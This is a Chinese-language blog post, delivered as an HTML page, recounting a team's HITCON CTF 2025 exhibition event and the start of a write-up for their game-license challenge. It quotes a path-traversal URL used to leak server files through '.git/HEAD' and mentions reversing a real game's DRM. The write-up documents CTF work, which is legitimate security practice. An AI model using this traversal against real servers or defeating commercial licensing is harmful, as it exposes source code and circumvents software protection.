@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Ching367436,臺中一中電腦資訊研習社 38th 副社長,Bamboofox 社長,書卷獎,資安,AIS3 最佳專題">
+    
+    <meta name="author" content="Ching367436">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.ching367436.me/hitcon-ctf-2025/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2025">
+<meta property="og:url" content="https://blog.ching367436.me/hitcon-ctf-2025/">
+<meta property="og:site_name" content="Ching367436">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.ching367436.me/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-10-20T03:45:50.000Z">
+<meta property="article:author" content="Ching367436">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="HITCON">
+<meta property="article:tag" content="template-engine">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.ching367436.me/images/redefine-og.webp">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-PRRP5V9HFQ"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-PRRP5V9HFQ');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HITCON CTF 2025 | Ching367436&#39;s blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <meta http-equiv="Content-Security-Policy" content="
+  default-src 'self' https://*.clarity.ms https://c.bing.com https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com https://cloudflareinsights.com ; 
+  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.clarity.ms https://c.bing.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://static.cloudflareinsights.com ; 
+  style-src 'unsafe-inline' 'self' https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com; 
+  img-src 'self' data: https://*.clarity.ms https://c.bing.com https://cdn.jsdelivr.net/ https://www.googletagmanager.com ;
+" />
+
+                
+    
+            
+                
+                    <script data-swup-reload-script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "gh62bmw6cl"); </script>
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap" rel="stylesheet">
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.ching367436.me","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["竹狐隊長"]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":false,"pangu_js":false,"recommendation":{"enable":true,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans TC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap"},"english":{"enable":true,"family":"Lexend","url":"https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":true,"id":"G-PRRP5V9HFQ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ching367436's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ching367436","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":[]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"none","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/3/20 21:33:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.0.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style><link rel="alternate" href="/atom.xml" title="Ching367436" type="application/atom+xml">
+</head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ching367436&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/hitcon-ctf-2025/tree.webp" alt="HITCON CTF 2025" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">HITCON CTF 2025</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/Ching367436.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Ching367436</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">竹狐隊長</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-20 11:45:50</span>
+        <span class="mobile">2025-10-20 11:45:50</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/HITCON/">HITCON</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/HITCON/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/template-engine/">template-engine</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/HITCON/">HITCON</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.9k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>16 Mins</span>
+        </span>
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>跟竹狐一起打了 HITCON CTF 獲得了 臺灣第一，世界 13 的成績；也在後續的交流賽中，榮獲第一。在<a href="/hitcon-ctf-2025-maximal-extractable-vuln">初賽主要負責了區塊鏈的題目</a>，跟去年星爆牛炒竹狐的時候一樣，不過多了可以一起討論區塊鏈的 Vincent；而交流賽則是專案管理、web。本篇文章涵蓋交流賽的部分，預賽的區塊鏈題解可以看 <a href="/hitcon-ctf-2025-maximal-extractable-vuln">這裡</a> 。</p>
+<h2 id="交流賽"><a href="#交流賽" class="headerlink" title="交流賽"></a>交流賽</h2><p>這次跟以往決賽的 Attack &amp; Defense + LiveCTF 類型不同，推出了 Belluminar 賽制：隊伍間互相出題及解題，蠻新奇的。主辦方的規則如下：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 本次 HITCON CTF 交流賽，將混合 Belluminar 賽制以及 eSport 賽制進行。 Belluminar 賽制為 POC 所提出，WCTF 也曾使用的方式。在此賽制下，各隊會互相出題挑戰。為增加競賽交流性，除了 CTF 競賽本體，也會舉辦對應的 seminar 來分享題目設計及解法。 </span><br><span class="line">2. 請各隊伍準備自己題目的題解投影片，於第二天的評審環節進行報告。</span><br><span class="line">3. 本次 HITCON CTF 交流賽，各隊需要事先準備兩道 Jeopardy 題目，題目的相關規定如下 </span><br><span class="line">  a. 其中一題需為 Pwn 或 Web，另一題不限定類型 </span><br><span class="line">  b. 一題需要簡單難度（3~4 隊解出），一題需要困難難度（1~2 隊解出）</span><br><span class="line">  c. 題目本身設計也會納入競賽總分，會參考：解題隊數（與難度相應得分高）、題目穩定性、題目設計評審評分及互評 </span><br><span class="line">4. 本份文件更新時，會在 Discord 組長頻道同步通知，請定時確認已面錯過重要資訊。</span><br><span class="line">5. 本次競賽 eSport 題目中會包含：Mac ARM, Android 的題目，請事先準備好可使用的環境。</span><br><span class="line">6. eSport 題組請各隊準備好有 RJ45 與 HDMI 接口的筆電。</span><br><span class="line">7. 解題過程中，若遭遇問題，請在 Discord 裡開 ticket，我們會將出題隊伍的負責人一起加入討論。 </span><br><span class="line">8. 題目如果出壞，需要進行 Revenge，請在 Discord 裡開 ticket 處理。出壞解不出來通常需要 Revenge，若是有 unintended solution，可以參閱記分規則，評估是否要 Revenge。</span><br></pre></td></tr></table></figure></div>
+
+<p>竹狐的 Belluminar 解題狀況在第二天，幾乎都是全場最多的；但由於積分規則很特別，我們繼續解題會讓排名往後（因為會增加其他隊的出題分），所以第二天直接沒有打算繼續解題，都在關心其他隊解題情況。</p>
+<h3 id="Belluminar"><a href="#Belluminar" class="headerlink" title="Belluminar"></a>Belluminar</h3><p>Belluminar 是由各隊出題，互相解題的題目；這次竹狐出了兩道題目</p>
+<ul>
+<li><p>[meduim] [web, reverse, crypto, gal game]《關於我前隊友是千金大小姐，我們鬧內鬨她威脅我要用人脈讓我特選上不了學校，但是他又想分享她的經歷多屌，我該怎麼辦》</p>
+</li>
+<li><p>[hard] [kernel pwn] Interrupt Paradise</p>
+</li>
+</ul>
+<p>Interrupt Paradise 是由 <a class="link" target="_blank" rel="noopener" href="https://naup.mygo.tw/">堇姬 Naup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 出，由 ConsoleBreak 驗題；而《關於我前隊友是千金大小姐…》則是由以下人員，歷時一個月共同完成：</p>
+<p>企劃：<a class="link" target="_blank" rel="noopener" href="https://ching367436.me/">Ching367436<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>腳本：<a class="link" target="_blank" rel="noopener" href="https://github.com/whiteskull20">WSL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>腳本兼不小心忘記填請假單於是翹課來玩（DRM 設計）：<a class="link" target="_blank" rel="noopener" href="https://asia-hokak.github.io/">Dr. dog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>竹狐娘本娘兼水銀燈老婆：<a href="(https://naup.mygo.tw/)">naup96321</a> (?<br>渡會雛見的兒子兼老公兼 License Server 兼 Digital Distribution：<a class="link" target="_blank" rel="noopener" href="https://iancmd.dev/posts/cybersecurity/ctf/hitcon-exhibition-ctf-2025/">ianiiaannn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>CG：<a class="link" target="_blank" rel="noopener" href="https://steamcommunity.com/id/yofatyozi/">YoFat<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>編劇：燒餅<br>前端設計：<a class="link" target="_blank" rel="noopener" href="https://elvismao.com/">毛哥EM<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>遊戲設計顧問：<a class="link" target="_blank" rel="noopener" href="https://flydragonw.github.io/">Flydragon<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h4 id="《關於我前隊友是千金大小姐…略》"><a href="#《關於我前隊友是千金大小姐…略》" class="headerlink" title="《關於我前隊友是千金大小姐…略》"></a>《關於我前隊友是千金大小姐…略》</h4><h5 id="出題動機"><a href="#出題動機" class="headerlink" title="出題動機"></a>出題動機</h5><p>這題是源自於某群 AIS3 助教，看到很多學員在玩 gal game，想說也來玩玩看；發現需要輸入 license 才能使用，所以就把 逆向 / MiTM 等，最後把遊戲的 license 保護機制逆向出來。決定把我們逆向過程中遇到的，出成題目給大家玩。</p>
+<h5 id="專案管理"><a href="#專案管理" class="headerlink" title="專案管理"></a>專案管理</h5><p>這次主要負責專案管理，是少數只專注在專案管理與架構設計的專案。會議記錄因為性質關係，使用了 <a class="link" target="_blank" rel="noopener" href="https://draw.io/">draw.io<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，蠻特別的；寫起來蠻容易讓人快速理解的。附上某次會議記錄供參考。專案管理中最重要的一點是責任要明確，讓每個人都清楚在什麼時間點該完成哪些具體事項；另一個關鍵則是把對的人放在對的位置，並確保大家都具備足夠的動機，一起把專案完成。只要做到這些，再加上一個實力堅強的團隊，專案很容易順利運行。<img src="/hitcon-ctf-2025/belluminar-plan.webp" alt="belluminar-plan"></p>
+<h5 id="題目題解"><a href="#題目題解" class="headerlink" title="題目題解"></a>題目題解</h5><p>題解前半部分<a class="link" target="_blank" rel="noopener" href="https://iancmd.dev/posts/cybersecurity/ctf/hitcon-exhibition-ctf-2025/#%E6%8E%A2%E7%B4%A2">隊友 ian 已經有詳細解說<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，所以這部分就快速帶過；這邊多補充了 用 mitmproxy 截取流量、觀察 DRM 運作的步驟，這也是我在逆向實際 DRM 時用到的技巧。</p>
+<p>進入題目網頁，發現可以下載 Bamboo Games Launcher。</p>
+<p><img src="/hitcon-ctf-2025/install-bamboo-games-launcher.webp"></p>
+<p>下載之後發現是個很像 steam client 的 Electron app（可以從 app 的圖像得知）</p>
+<p><img src="/hitcon-ctf-2025/bamboo-game-launcher-client.webp" alt="s"></p>
+<p>進入 Bamboo Games Launcher 後，可以下載遊戲。</p>
+<p>遊戲下載打開後，會要輸入 license key。</p>
+<p><img src="/hitcon-ctf-2025/enter-license-key.webp"></p>
+<p>不輸入 license key，遊戲也會正常打開，只是不管怎麼玩都會是 bad end。</p>
+<p><img src="/hitcon-ctf-2025/game-bad-end.webp"></p>
+<p>開始研究 license key 是如何驗證的，會發現用的跟 Bamboo Games Launcher 是同個 web serveer；發現 Bamboo Games Launcher 是用 Electron 寫的。找到 Electron 使用的 <code>C:\Users\User\AppData\Local\bamboo_games_launcher\app-1.0.0\resources\app.asar</code> 並打開。</p>
+<p>可以看到 <code>src/index.js</code> 從 <code>https://xn--kpr97vl4kg3x.xn--e5x.tw:9114/static/..%2Fgames/bamboo-gal.asar.gz</code> 下載遊戲，經過測試這個 LFI 可以用來下載 <code>.git/HEAD</code> 來 leak 出 server source code，當中很可能包含了 license 的驗證邏輯。</p>
